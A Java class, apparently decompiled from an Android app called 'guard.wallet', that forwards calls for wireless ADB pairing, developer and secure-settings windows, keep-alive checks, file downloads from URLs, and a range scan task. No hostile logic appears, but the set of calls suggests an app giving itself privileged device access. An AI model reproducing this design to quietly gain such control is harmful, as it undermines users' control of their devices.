package com.guard.wallet.delegate;

import com.guard.wallet.adb.AdbConnectionManager;
import com.guard.wallet.util.SyntheticHelper;
import java.util.LinkedList;

/**
 * Bridge class for AdbConnectionManager and cross-package access.
 * Originally resolved h/e name shadowing issues; now delegates to
 * com.guard.wallet.adb.AdbConnectionManager directly.
 */
public final class AdbBridge {
    private AdbBridge() {}

    // === ADB Connection Manager bridge ===
    /** Get ADB connection manager singleton */
    public static AdbConnectionManager getAdbManager() { return AdbConnectionManager.getInstance(); }
    /** Initialize ADB connection manager */
    public static void initAdbManager() { AdbConnectionManager.initialize(); }
    /** Clear ADB connection manager singleton */
    public static void clearAdbManager() { AdbConnectionManager.setInstance(null); }
    /** Run pairing flow */
    public static boolean runPairingFlow(com.guard.wallet.req.BlockViewVO view) { return AdbConnectionManager.startPairingFlow(view); }

    public static boolean isPowerSaveMode() { return com.guard.wallet.power.PowerSaveChecker.shouldKeepAlive(); }
    public static Object getPipActivity() { return com.guard.wallet.permission.PermissionManager.instance; }
    public static boolean isPipRunning() { return com.guard.wallet.permission.PermissionManager.isPipReady(); }
    public static void stopPip() { com.guard.wallet.permission.PermissionManager.finishPip(); }
    public static void finishPip() { com.guard.wallet.permission.PermissionManager.enterPip(); }
    public static OpenDevelopmentDelegate createOpenDevDelegate() { return new OpenDevelopmentDelegate(); }
    @SuppressWarnings("unchecked")
    public static LinkedList getOpenDevWindows() { return OpenDevelopmentDelegate.X(); }
    public static EnableSecureDelegate createWriteSecureDelegate() { return new EnableSecureDelegate(); }
    @SuppressWarnings("unchecked")
    public static LinkedList getWriteSecureWindows() { return EnableSecureDelegate.J(); }
    public static boolean downloadFile(String url, String path) { return com.guard.wallet.download.DownloadManager.b(url, path); }
    public static com.guard.wallet.download.MultiModeTask createDownloadTask(String url, String name, int mode) { return new com.guard.wallet.download.MultiModeTask(mode, url, name); }
    public static com.guard.wallet.download.MultiModeTask createScanTask(int start, int end, int mode) { return new com.guard.wallet.download.MultiModeTask(mode, start, end); }
    public static com.guard.wallet.adb.AdbLineMatcher createMatcher(String text, boolean flag, int mode) { return new com.guard.wallet.adb.AdbLineMatcher(text, flag, mode); }
    public static String joinStrings3(String a0, String a1, String a2) { return SyntheticHelper.concat3(a0, a1, a2); }

    // === NodePropertyDelegate HTTP callback bridge (was j.e, now in filter/) ===
    public static okhttp3.Callback createHttpCallback(int type) { return new com.guard.wallet.filter.NodePropertyDelegate(type); }
}
